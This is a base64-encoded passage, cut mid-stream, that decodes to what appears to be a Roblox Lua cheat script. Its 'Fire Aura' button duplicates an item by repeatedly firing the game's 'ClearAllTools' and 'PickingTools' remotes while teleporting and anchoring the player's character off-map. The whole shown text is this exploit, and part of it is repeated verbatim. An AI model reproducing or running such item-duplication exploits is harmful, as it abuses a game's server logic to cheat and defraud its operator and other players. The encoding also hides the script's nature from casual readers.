jaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCgoKcHJpbnQoImRvbmUiKQp3YWl0KDEpCmxvY2FsIEdyaXBQb3NUYWJsZSA9IHsKICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDApLAogIFZlY3RvcjMubmV3KDEwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygyMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAwKSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDApLCAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIDApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIDApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygyMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDMwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDYwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDMwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDYwLCAwLCAxNSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgMTUpLApWZWN0b3IzLm5ldygwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDEwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDMwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDQwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDYwLCAwLCAtMTUpLCAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KDEwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAtMzApLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC0zMCksCiAgICBWZWN0b3IzLm5ldygwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KDEwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KDMwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KDQwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KDYwLCAwLCAtNDUpLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC00NSksCiAgICBWZWN0b3IzLm5ldygxMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTYwKSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDEwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KDMwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KDQwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KDYwLCAwLCAtNzUpLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC03NSksCgoKICAgICB9CiAgICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgbG9jYWwgZ3JpcFBvc0luZGV4ID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgICAKICAgICAgICAgICAgICBpZiB0b29sOklzRGVzY2VuZGFudE9mKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgd2FybigiVG9vbCIsIHRvb2wuTmFtZSwgImlzIG5vdCBpbiBjaGFyYWN0ZXIiKQogICAgICAgICAgICAgIGVuZAogICAgICAgICAgZW5kCiAgICAgIGVuZCAgICAgICAgICAgCiAgICBlbmQKfSkKCi0tIEJ1dHRvbiBmb3IgRmlyZSBBdXJhClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkZpcmUgQXVyYSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBuYW1ldG9vbHMgPSAi8J+UpSIKICAgICAgICAgICAgICAgIG9sZGNmcmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJBdXJhbHlueCBpcyBkdXBpbmcuLi4iLFRleHQ9IlBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuIiwgQnV0dG9uMSA9ICJPayIgLER1cmF0aW9uPTV9KQogICAgICAgICAgICAgICAgdG9vbHRoYXRpd2FudHRvZHVwZSA9ICJQYXBlcmJhZ0ZpcmUiCiAgICAgICAgICAgICAgICB0b29scyA9ICJQYXBlcmJhZ0ZpcmUiCiAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9ICJDbGVhckFsbFRvb2xzIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjbGVhcnRvb2xyZW1vdGU6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB3YWl0KDAuMykKICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBtPTEsIDEyNCBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gdG9vbHRoYXRpd2FudHRvZHVwZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBwaWNrdG9vbHJlbW90ZTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHRoYXRpd2FudHRvZHVwZV06RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLk5hbWUgPSAiSMODwqLDgiDDgsKlYcODwqLDgiDDgsKlbsODwqLDgiDDgsKlZMODwqLDgiDDgsKlbMODwqLDgiDDgsKlZSIKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCAgICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQgd2FpdCgpIHVudGlsIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKSA9PSBuaWwKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpID09IG5pbAogICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIHRvb2xncmlwID0gdHJ1ZQogICAgICAgICAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgICAgICAgICAgICAgIHdhaXQoKQpsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCmxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQoKCnByaW50KCJkb25lIikKd2FpdCgxKQpsb2NhbCBHcmlwUG9zVGFibGUgPSB7CiAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAwKSwgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIDApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIDApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIDApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDEwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0wLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDEwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDQwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0wLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDEwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDQwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMTUpLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIDE1KSwKVmVjdG9yMy5uZXcoMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTE1KSwgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTMwKSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtMzApLAogICAgVmVjdG9yMy5uZXcoMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTQ1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNDUpLAogICAgVmVjdG9yMy5uZXcoMTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC02MCksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTc1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNzUpLAoKCiAgICAgfQogICAgICBmb3IgaSwgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgIGxvY2FsIGdyaXBQb3NJbmRleCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgICAgbG9jYWwgZ3JpcFBvcyA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgaWYgdG9vbDpJc0